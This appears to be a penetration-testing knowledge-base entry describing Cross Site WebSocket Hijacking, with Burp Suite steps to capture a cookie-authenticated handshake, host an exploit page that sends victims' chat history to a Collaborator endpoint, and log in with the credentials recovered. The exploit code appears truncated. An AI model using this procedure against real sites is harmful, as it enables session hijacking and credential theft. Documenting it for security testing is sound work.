---
id: 52c8110c-5aaf-4bce-ace5-90252bea4155
name: Cross Site Web Socket Hijacking
type: procedure
verified: true
submitted: true
created_at: '2020-08-22T13:07:06.713350+00:00'
updated_at: '2023-05-26T01:10:13.986881+00:00'
platforms:
- Web
tags:
- '[[cross site web socket hijacking]]'
- '[[Web Applications]]'
- '[[web sockets]]'
---

# Cross Site Web Socket Hijacking

**Status**: ✓ Verified

## Summary

When the web socket handshake relies on http cookies to handle session  without implementing CSRF tokens, it is possible for an attacker to perform unauthorised actions impersonating the victim. 

## Description

# Description

When the web socket handshake relies on http cookies to handle session  without implementing CSRF tokens, it is possible for an attacker to perform unauthorised actions impersonating the victim.

# Instructions

1. Observe the live chat on the application.

2.Under Burp proxy , in the web sockets history ,observe that ready command retreives the past chat messages from the server . Identify the web socket handshake and send it to the repeater.

3. Use Burp Suite professional to start the burp collaborator client and click on copy to *clipboard*

4. Craft a exploit in the similar way as below and host it on the server. Deliver this exploit to the victim. Change the URL in the web socket handshake from step 2 to the crafted url generated here.

**Code**: [[<script>
websocket = new WebSocket('wss://your-we]]

5. Click on poll now to generate responses from the application server. Observe the HTTP reqeusts and responses in the collaborator window.

6. Decode the url from the response in the collaborator window using decoder tab in burp suite. Login into the application with the credentials obtained from decoder.

## Platforms

- Web

## Tags

- [[cross site web socket hijacking]]
- [[Web Applications]]
- [[web sockets]]
